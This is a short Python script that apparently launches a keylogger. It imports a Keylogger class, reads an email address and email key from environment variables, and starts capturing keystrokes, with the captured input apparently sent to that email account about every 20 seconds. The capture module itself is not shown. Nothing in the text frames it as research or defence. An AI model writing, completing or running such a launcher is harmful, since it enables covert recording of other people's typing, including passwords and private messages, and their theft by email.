from key_logger import Keylogger
from dotenv import load_dotenv
import os

my_key_logger = Keylogger(20, os.getenv("EMAIL"), os.getenv("EMAIL_KEY"))

my_key_logger.start()